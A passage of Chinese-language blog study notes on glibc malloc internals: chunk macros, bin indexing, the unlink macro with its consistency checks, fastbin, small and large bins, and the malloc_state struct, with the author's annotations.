size of the chunk below P.  Only valid if !prev_inuse (P).  */</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> set_prev_size(p, sz) ((p)-&gt;mchunk_prev_size = (sz))</span><br><span class="hljs-comment">/* Ptr to previous physical malloc_chunk.  Only valid if !prev_inuse (P).  */</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> prev_chunk(p) ((mchunkptr) (((char *) (p)) - prev_size (p)))</span><br><span class="hljs-comment">/* Treat space at ptr + offset as a chunk */</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> chunk_at_offset(p, s)  ((mchunkptr) (((char *) (p)) + (s)))</span><br><span class="hljs-comment">/* extract p&#x27;s inuse bit */</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> inuse(p)                                                              \</span><br><span class="hljs-meta">  ((((mchunkptr) (((char *) (p)) + chunksize (p)))-&gt;mchunk_size) &amp; PREV_INUSE)</span><br><span class="hljs-comment">/* set/clear chunk as being inuse without otherwise disturbing */</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> set_inuse(p)                                                              \</span><br><span class="hljs-meta">  ((mchunkptr) (((char *) (p)) + chunksize (p)))-&gt;mchunk_size |= PREV_INUSE</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> clear_inuse(p)                                                              \</span><br><span class="hljs-meta">  ((mchunkptr) (((char *) (p)) + chunksize (p)))-&gt;mchunk_size &amp;= ~(PREV_INUSE)</span><br><span class="hljs-comment">/* check/set/clear inuse bits in known places */</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> inuse_bit_at_offset(p, s)                                              \</span><br><span class="hljs-meta">  (((mchunkptr) (((char *) (p)) + (s)))-&gt;mchunk_size &amp; PREV_INUSE)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> set_inuse_bit_at_offset(p, s)                                              \</span><br><span class="hljs-meta">  (((mchunkptr) (((char *) (p)) + (s)))-&gt;mchunk_size |= PREV_INUSE)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> clear_inuse_bit_at_offset(p, s)                                              \</span><br><span class="hljs-meta">  (((mchunkptr) (((char *) (p)) + (s)))-&gt;mchunk_size &amp;= ~(PREV_INUSE))</span><br><span class="hljs-comment">/* Set size at head, without disturbing its use bit */</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> set_head_size(p, s)  ((p)-&gt;mchunk_size = (((p)-&gt;mchunk_size &amp; SIZE_BITS) | (s)))</span><br><span class="hljs-comment">/* Set size/use field */</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> set_head(p, s)       ((p)-&gt;mchunk_size = (s))</span><br><span class="hljs-comment">/* Set size at footer (only when chunk is not in use) */</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> set_foot(p, s)       (((mchunkptr) ((char *) (p) + (s)))-&gt;mchunk_prev_size = (s))</span><br></code></pre></div></td></tr></table></figure><h2 id="Bin"><a href="#Bin" class="headerlink" title="Bin"></a>Bin</h2><h3 id="在malloc-state中的存储"><a href="#在malloc-state中的存储" class="headerlink" title="在malloc_state中的存储"></a>在malloc_state中的存储</h3><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">malloc_state</span></span><br><span class="hljs-class">&#123;</span><br><span class="hljs-comment">/* Fastbins */</span><br>mfastbinptr fastbinsY[NFASTBINS];<br><span class="hljs-comment">/* Normal bins packed as described above */</span><br>mchunkptr bins[NBINS * <span class="hljs-number">2</span> - <span class="hljs-number">2</span>];<br>&#125;;<br></code></pre></div></td></tr></table></figure><h3 id="bin数组定位"><a href="#bin数组定位" class="headerlink" title="bin数组定位"></a>bin数组定位</h3><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-comment">/* addressing -- note that bin_at(0) does not exist, */</span><span class="hljs-comment">/*Bin 1 is the unordered list*/</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> bin_at(m, i) \</span><br><span class="hljs-meta">  (mbinptr) (((char *) &amp;((m)-&gt;bins[((i) - 1) * 2]))                              \</span><br><span class="hljs-meta">             - offsetof (struct malloc_chunk, fd))  </span><br><span class="hljs-comment">/* analog of ++bin */</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> next_bin(b)  ((mbinptr) ((char *) (b) + (sizeof (mchunkptr) &lt;&lt; 1)))</span><br><span class="hljs-comment">/* Reminders about list directionality within bins */</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> first(b)     ((b)-&gt;fd)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> last(b)      ((b)-&gt;bk)</span><br></code></pre></div></td></tr></table></figure><ul><li><p>bin_at的神奇操作: </p><ul><li>对外部而言, bin数组应该为128个, 输入的下标也是如此, 到了内部将其转换为该位置chunk的fd指针, 取地址”&amp;”, 转换为单字节指针char *, 然后减去chunk head的字节数, 变为该chunk的头部</li><li>除了外部下标到内部下标的转换, <strong>其余步骤相当于mem2chunk()的结果</strong> </li></ul></li><li><p>为什么是两个呢?</p><p>因为每个bin链在bins数组中存储的是一个fd指针和一个bk指针，即两个malloc chunk指针，所以要NBINS * 2<br>又因为数组bins中索引为0、1的指针是不使用的，所以要减去2</p><blockquote><p>例： bins[2]为unsorted bin链的fd成员，bin[3]为其bk成员, bin[0]为其presize, bin[1]为其size</p></blockquote><img src="../../image/glibc_malloc_srcCode/sbzY4vrhU2wZypm.png" style="zoom: 33%;" /> </li></ul><h3 id="unlink：从bins中取出chunk"><a href="#unlink：从bins中取出chunk" class="headerlink" title="unlink：从bins中取出chunk"></a>unlink：从bins中取出chunk</h3><ul><li>2.25中unlink为宏定义, 2.26为unlink_chunk函数, 仅仅多了一个检查<ul><li><code>if (chunksize (p) != prev_size (next_chunk (p)))  malloc_printerr (&quot;corrupted size vs. prev_size&quot;);</code> </li></ul></li></ul><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-comment">/* Take a chunk off a bin list */</span><span class="hljs-comment">//省略了每行末尾的反斜杠</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> unlink(AV, P, BK, FD) </span><br>&#123; <span class="hljs-comment">//例子unlink(av, victim, bck, fwd)</span><br>    FD = P-&gt;fd;<span class="hljs-comment">//取出victim的fd和bk指针</span><br>    BK = P-&gt;bk;<br><span class="hljs-comment">//例行检查,实际上就是如果victim没有完整的在链表中的话就报错</span><br>    <span class="hljs-keyword">if</span> (__builtin_expect (FD-&gt;bk != P || BK-&gt;fd != P, <span class="hljs-number">0</span>))<br>      malloc_printerr (check_action, <span class="hljs-string">&quot;corrupted double-linked list&quot;</span>, P, AV);<br>    <span class="hljs-keyword">else</span> &#123;<span class="hljs-comment">//如果正常的话</span><br>        FD-&gt;bk = BK;<br>        BK-&gt;fd = FD; <span class="hljs-comment">//取出了victim</span><br>        <span class="hljs-keyword">if</span> (!in_smallbin_range (chunksize_nomask (P)) &amp;&amp; __builtin_expect (P-&gt;fd_nextsize != <span class="hljs-literal">NULL</span>, <span class="hljs-number">0</span>)) <br>        &#123;<span class="hljs-comment">//如果在largebin里的链表 且 在chunk size链表里则需要额外设置fd_nextsize和bk_nextsize</span><br>            <span class="hljs-comment">//简单的检查, victim是不是 *完整的* 在chunk size链表</span><br>        <span class="hljs-keyword">if</span> (__builtin_expect (P-&gt;fd_nextsize-&gt;bk_nextsize != P, <span class="hljs-number">0</span>)<br>|| __builtin_expect (P-&gt;bk_nextsize-&gt;fd_nextsize != P, <span class="hljs-number">0</span>))<br>      malloc_printerr (check_action, <span class="hljs-string">&quot;corrupted double-linked list (not small)&quot;</span>, P, AV);<br>            <span class="hljs-keyword">if</span> (FD-&gt;fd_nextsize == <span class="hljs-literal">NULL</span>) &#123;<span class="hljs-comment">//FD和victim同样大小</span><br>                <span class="hljs-keyword">if</span> (P-&gt;fd_nextsize == P)<span class="hljs-comment">//fd_nextsize等于自身只能说明链表里只有这个大小</span><br>                  <span class="hljs-comment">//现在就剩下FD(后面或许还有等大的)了, 修改一下chunk size链表</span><br>                  FD-&gt;fd_nextsize = FD-&gt;bk_nextsize = FD;<br>                <span class="hljs-keyword">else</span> &#123;<span class="hljs-comment">//链表里还有其他的chunk</span><br>                    FD-&gt;fd_nextsize = P-&gt;fd_nextsize;<br>                    FD-&gt;bk_nextsize = P-&gt;bk_nextsize;<br>                    P-&gt;fd_nextsize-&gt;bk_nextsize = FD;<br>                    P-&gt;bk_nextsize-&gt;fd_nextsi  ze = FD;<br>                  &#125;<br>            &#125; <span class="hljs-keyword">else</span> &#123;<span class="hljs-comment">//victim是一个单独的chunk</span><br>                P-&gt;fd_nextsize-&gt;bk_nextsize = P-&gt;bk_nextsize;<br>                P-&gt;bk_nextsize-&gt;fd_nextsize = P-&gt;fd_nextsize;<br>            &#125;<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></div></td></tr></table></figure><h3 id="fastbin"><a href="#fastbin" class="headerlink" title="fastbin"></a>fastbin</h3><p><strong>相关介绍和特点</strong> </p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment">   Fastbins</span><br><span class="hljs-comment">    An array of lists holding recently freed small chunks.  Fastbins</span><br><span class="hljs-comment">    are not doubly linked.  It is faster to single-link them, and</span><br><span class="hljs-comment">    since chunks are never removed from the middles of these lists,</span><br><span class="hljs-comment">    double linking is not necessary. Also, unlike regular bins, they</span><br><span class="hljs-comment">    are not even processed in FIFO order (they use faster LIFO) since</span><br><span class="hljs-comment">    ordering doesn&#x27;t much matter in the transient contexts in which</span><br><span class="hljs-comment">    fastbins are normally used.</span><br><span class="hljs-comment">    Chunks in fastbins keep their inuse bit set, so they cannot</span><br><span class="hljs-comment">    be consolidated with other free chunks. malloc_consolidate</span><br><span class="hljs-comment">    releases all chunks in fastbins and consolidates them with</span><br><span class="hljs-comment">    other free chunks.</span><br><span class="hljs-comment"> */</span><br>- 使用LIFO, 在链表头执行取出插入操作<br>- PREV_INUSE总为<span class="hljs-number">1</span>, 不会和相邻块进行合并<br>- chunk从不会在链表中间被删去, 只需要单向链表即可<br></code></pre></div></td></tr></table></figure><p><strong>indexing</strong> </p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">malloc_chunk</span> *<span class="hljs-title">mfastbinptr</span>;</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> fastbin(ar_ptr, idx) ((ar_ptr)-&gt;fastbinsY[idx])</span><br><span class="hljs-comment">/* offset 2 to use otherwise unindexable first 2 bins */</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> fastbin_index(sz) \</span><br><span class="hljs-meta">  ((((unsigned int) (sz)) &gt;&gt; (SIZE_SZ == 8 ? 4 : 3)) - 2)</span><br></code></pre></div></td></tr></table></figure><ul><li>从fastbin_index方法也可以看出fastbin是将<strong>chunk大小</strong>转换为<strong>数据空间大小</strong>来index的, 从最短的8字节到80字节(默认64字节), 实际上支持(80 * SIZE_SZ / 4)字节</li></ul><p><strong>数量和容量</strong> </p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-comment">/* The maximum fastbin request size we support */</span><br><span class="hljs-comment">//    DEFAULT_MXFAST     64 (for 32bit), 128 (for 64bit)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> MAX_FAST_SIZE     (80 * SIZE_SZ / 4)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> NFASTBINS  (fastbin_index (request2size (MAX_FAST_SIZE)) + 1)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> FASTBIN_CONSOLIDATION_THRESHOLD  (65536UL)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> set_max_fast(s) \</span><br><span class="hljs-meta">  global_max_fast = (((s) == 0)                                                      \</span><br><span class="hljs-meta">                     ? SMALLBIN_WIDTH : ((s + SIZE_SZ) &amp; ~MALLOC_ALIGN_MASK))</span><br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment">   FASTBIN_CONSOLIDATION_THRESHOLD is the size of a chunk in free()</span><br><span class="hljs-comment">   that triggers automatic consolidation of possibly-surrounding</span><br><span class="hljs-comment">   fastbin chunks. This is a heuristic, so the exact value should not</span><br><span class="hljs-comment">   matter too much. It is defined at half the default trim threshold as a</span><br><span class="hljs-comment">   compromise heuristic to only attempt consolidation if it is likely</span><br><span class="hljs-comment">   to lead to trimming. However, it is not dynamically tunable, since</span><br><span class="hljs-comment">   consolidation reduces fragmentation surrounding large chunks even</span><br><span class="hljs-comment">   if trimming is not used.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> FASTBIN_CONSOLIDATION_THRESHOLD  (65536UL)</span><br></code></pre></div></td></tr></table></figure><hr><h3 id="unsorted-bin"><a href="#unsorted-bin" class="headerlink" title="unsorted bin"></a>unsorted bin</h3><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-comment">/* The otherwise unindexable 1-bin is used to hold unsorted chunks. */</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> unsorted_chunks(M)          (bin_at (M, 1))</span><br></code></pre></div></td></tr></table></figure><h3 id="small-bin"><a href="#small-bin" class="headerlink" title="small bin"></a>small bin</h3><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> NSMALLBINS         64</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> SMALLBIN_WIDTH    MALLOC_ALIGNMENT <span class="hljs-comment">//可能32为8, 64为16??</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> SMALLBIN_CORRECTION (MALLOC_ALIGNMENT &gt; 2 * SIZE_SZ) <span class="hljs-comment">//暂时不知道这是做啥的, 一般为0</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> MIN_LARGE_SIZE    ((NSMALLBINS - SMALLBIN_CORRECTION) * SMALLBIN_WIDTH) <span class="hljs-comment">//32:512  64:1024</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> in_smallbin_range(sz)  \</span><br><span class="hljs-meta">  ((unsigned long) (sz) &lt; (unsigned long) MIN_LARGE_SIZE)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> smallbin_index(sz) \</span><br><span class="hljs-meta">  ((SMALLBIN_WIDTH == 16 ? (((unsigned) (sz)) &gt;&gt; 4) : (((unsigned) (sz)) &gt;&gt; 3))\</span><br><span class="hljs-meta">   + SMALLBIN_CORRECTION)</span><br></code></pre></div></td></tr></table></figure><ul><li><p>可以看到MIN_LARGE_SIZE用作了判断块大小是否位于small bin的范围内</p></li><li><p>small bin 紧跟在unsorted bin之后, 索引从2-??(自己想去), 所以index只需要移位就可以了, 相邻下标之间间隔0x10(64), 0x8(32)</p></li><li><p><strong>small bin和fast bin有一部分范围是重合的</strong> </p></li><li><p><strong>FILO 链头入链尾出</strong> </p></li><li><p>small bin结构: 双向链表</p><p>待补充, 之前想错了</p></li></ul><h3 id="large-bin"><a href="#large-bin" class="headerlink" title="large bin"></a>large bin</h3><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> MIN_LARGE_SIZE    ((NSMALLBINS - SMALLBIN_CORRECTION) * SMALLBIN_WIDTH)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> largebin_index_32(sz)                                                \</span><br><span class="hljs-meta">  (((((unsigned long) (sz)) &gt;&gt; 6) <span class="hljs-meta-string">&lt;= 38) ?  56 + (((unsigned long) (sz)) &gt;</span>&gt; 6) :\</span><br><span class="hljs-meta">   ((((unsigned long) (sz)) &gt;&gt; 9) <span class="hljs-meta-string">&lt;= 20) ?  91 + (((unsigned long) (sz)) &gt;</span>&gt; 9) :\</span><br><span class="hljs-meta">   ((((unsigned long) (sz)) &gt;&gt; 12) <span class="hljs-meta-string">&lt;= 10) ? 110 + (((unsigned long) (sz)) &gt;</span>&gt; 12) :\</span><br><span class="hljs-meta">   ((((unsigned long) (sz)) &gt;&gt; 15) <span class="hljs-meta-string">&lt;= 4) ? 119 + (((unsigned long) (sz)) &gt;</span>&gt; 15) :\</span><br><span class="hljs-meta">   ((((unsigned long) (sz)) &gt;&gt; 18) <span class="hljs-meta-string">&lt;= 2) ? 124 + (((unsigned long) (sz)) &gt;</span>&gt; 18) :\</span><br><span class="hljs-meta">   126)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> largebin_index_32_big(sz)                                            \</span><br><span class="hljs-meta">  (((((unsigned long) (sz)) &gt;&gt; 6) <span class="hljs-meta-string">&lt;= 45) ?  49 + (((unsigned long) (sz)) &gt;</span>&gt; 6) :\</span><br><span class="hljs-meta">   ((((unsigned long) (sz)) &gt;&gt; 9) <span class="hljs-meta-string">&lt;= 20) ?  91 + (((unsigned long) (sz)) &gt;</span>&gt; 9) :\</span><br><span class="hljs-meta">   ((((unsigned long) (sz)) &gt;&gt; 12) <span class="hljs-meta-string">&lt;= 10) ? 110 + (((unsigned long) (sz)) &gt;</span>&gt; 12) :\</span><br><span class="hljs-meta">   ((((unsigned long) (sz)) &gt;&gt; 15) <span class="hljs-meta-string">&lt;= 4) ? 119 + (((unsigned long) (sz)) &gt;</span>&gt; 15) :\</span><br><span class="hljs-meta">   ((((unsigned long) (sz)) &gt;&gt; 18) <span class="hljs-meta-string">&lt;= 2) ? 124 + (((unsigned long) (sz)) &gt;</span>&gt; 18) :\</span><br><span class="hljs-meta">   126)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> largebin_index_64(sz)                                                \</span><br><span class="hljs-meta">  (((((unsigned long) (sz)) &gt;&gt; 6) <span class="hljs-meta-string">&lt;= 48) ?  48 + (((unsigned long) (sz)) &gt;</span>&gt; 6) :\</span><br><span class="hljs-meta">   ((((unsigned long) (sz)) &gt;&gt; 9) <span class="hljs-meta-string">&lt;= 20) ?  91 + (((unsigned long) (sz)) &gt;</span>&gt; 9) :\</span><br><span class="hljs-meta">   ((((unsigned long) (sz)) &gt;&gt; 12) <span class="hljs-meta-string">&lt;= 10) ? 110 + (((unsigned long) (sz)) &gt;</span>&gt; 12) :\</span><br><span class="hljs-meta">   ((((unsigned long) (sz)) &gt;&gt; 15) <span class="hljs-meta-string">&lt;= 4) ? 119 + (((unsigned long) (sz)) &gt;</span>&gt; 15) :\</span><br><span class="hljs-meta">   ((((unsigned long) (sz)) &gt;&gt; 18) <span class="hljs-meta-string">&lt;= 2) ? 124 + (((unsigned long) (sz)) &gt;</span>&gt; 18) :\</span><br><span class="hljs-meta">   126)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> largebin_index(sz) \</span><br><span class="hljs-meta">  (SIZE_SZ == 8 ? largebin_index_64 (sz)                                     \</span><br><span class="hljs-meta">   : MALLOC_ALIGNMENT == 16 ? largebin_index_32_big (sz)                     \</span><br><span class="hljs-meta">   : largebin_index_32 (sz))</span><br></code></pre></div></td></tr></table></figure><ul><li><p>fd_nextsize和bk_nextsize只适用于large bins, 且pointer to next larger size.</p></li><li><p><strong>从链头(bin处) 到 链尾，沿着各个chunk的fd指针，chunks大小从高到低，依次排序</strong> </p><ul><li><p>fd_nextsize 指向前一个与当前 chunk 大小不同的第一个空闲块，<strong>不包含 bin 的头指针</strong>。</p></li><li><p>bk_nextsize 指向后一个与当前 chunk 大小不同的第一个空闲块，<strong>不包含 bin 的头指针</strong>。</p></li><li><p>large bin结构:</p></li></ul><p><img src="../../image/glibc_malloc_srcCode/KHlB5YwzDnq1pmZ.png" alt="large-bin"> </p></li></ul><h3 id="Top"><a href="#Top" class="headerlink" title="Top"></a>Top</h3><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment">   Top</span><br><span class="hljs-comment">    The top-most available chunk (i.e., the one bordering the end of</span><br><span class="hljs-comment">    available memory) is treated specially. It is never included in</span><br><span class="hljs-comment">    any bin, is used only if no other chunk is available, and is</span><br><span class="hljs-comment">    released back to the system if it is very large (see</span><br><span class="hljs-comment">    M_TRIM_THRESHOLD).  Because top initially</span><br><span class="hljs-comment">    points to its own bin with initial zero size, thus forcing</span><br><span class="hljs-comment">    extension on the first malloc request, we avoid having any special</span><br><span class="hljs-comment">    code in malloc to check whether it even exists yet. But we still</span><br><span class="hljs-comment">    need to do so when getting memory from system, so we make</span><br><span class="hljs-comment">    initial_top treat the bin as a legal but unusable chunk during the</span><br><span class="hljs-comment">    interval between initialization and the first call to</span><br><span class="hljs-comment">    sysmalloc. (This is somewhat delicate, since it relies on</span><br><span class="hljs-comment">    the 2 preceding words to be zero during this interval as well.)</span><br><span class="hljs-comment"> */</span><br><span class="hljs-comment">/* Conveniently, the unsorted bin can be used as dummy top on first call */</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> initial_top(M)              (unsorted_chunks (M))</span><br></code></pre></div></td></tr></table></figure><h3 id="总的index"><a href="#总的index" class="headerlink" title="总的index"></a>总的index</h3><pre><code class=" mermaid">graph LRg([bin_index])--&gt;a(smallbin_index) &amp; b(largebin_index)b--&gt;|64|largebin_index_64b--&gt;|32 &amp; MALLOC_ALIGNMENT == 16|m[largebin_index_32_big]b--&gt;|32 &amp; != 16|largebin_index_32</code></pre><h2 id="核心结构体"><a href="#核心结构体" class="headerlink" title="核心结构体"></a>核心结构体</h2><h3 id="malloc-state"><a href="#malloc-state" class="headerlink" title="malloc_state"></a>malloc_state</h3><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">malloc_state</span></span><br><span class="hljs-class">&#123;</span><br>  <span class="hljs-comment">/* Serialize access.  */</span><br>  __libc_lock_define (, mutex);<br>  <span class="hljs-comment">/* Flags (formerly in max_fast).  */</span><br>  <span class="hljs-keyword">int</span> flags;<br>  <span class="hljs-comment">/* Set if the fastbin chunks contain recently inserted free blocks.  */</span><br>  <span class="hljs-comment">/* Note this is a bool but not all targets support atomics on booleans.  */</span><br>  <span class="hljs-keyword">int</span> have_fastchunks;   <span class="hljs-comment">//have_fastchunks是glibc 2.27 及以后特有的, 四字节32位可用</span><br>  <span class="hljs-comment">/* Fastbins */</span><br>  mfastbinptr fastbinsY[NFASTBINS];<br>  <span class="hljs-comment">/* Base of the topmost chunk -- not otherwise kept in a bin */</span><br>  mchunkptr top;<br>  <span class="hljs-comment">/* The remainder from the most recent split of a small request */</span><br>  mchunkptr last_remainder;<br>  <span class="hljs-comment">/* Normal bins packed as described above */</span><br>  mchunkptr bins[NBINS * <span class="hljs-number">2</span> - <span class="hljs-number">2</span>];<br>  <span class="hljs-comment">/* Bitmap of bins */</span><br>  <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> binmap[BINMAPSIZE];<br>  <span class="hljs-comment">/* Linked list */</span><br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">malloc_state</span> *<span class="hljs-title">next</span>;</span><br>  <span class="hljs-comment">/* Linked list for free arenas.  Access to this field is serialized</span><br><span class="hljs-comment">     by free_list_lock in arena.c.  */</span><br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">malloc_state</span> *<span class="hljs-title">next_free</span>;</span><br>  <span class="hljs-comment">/* Number of threads attached to this arena.  0 if the arena is on</span><br><span class="hljs-comment">     the free list.  Access to this field is serialized by</span><br><span class="hljs-comment">     free_list_lock in arena.c.  */</span><br>  INTERNAL_SIZE_T attached_threads;<br>  <span class="hljs-comment">/* Memory allocated from the system in this arena.  */</span><br>  INTERNAL_SIZE_T system_mem;<br>  INTERNAL_SIZE_T max_system_mem;<br>&#125;;<br></code></pre></div></td></tr></table></figure><p><strong>flags</strong> </p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment">   FASTCHUNKS_BIT held in max_fast indicates that there are probably</span><br><span class="hljs-comment">   some fastbin chunks. It is set true on entering a chunk into 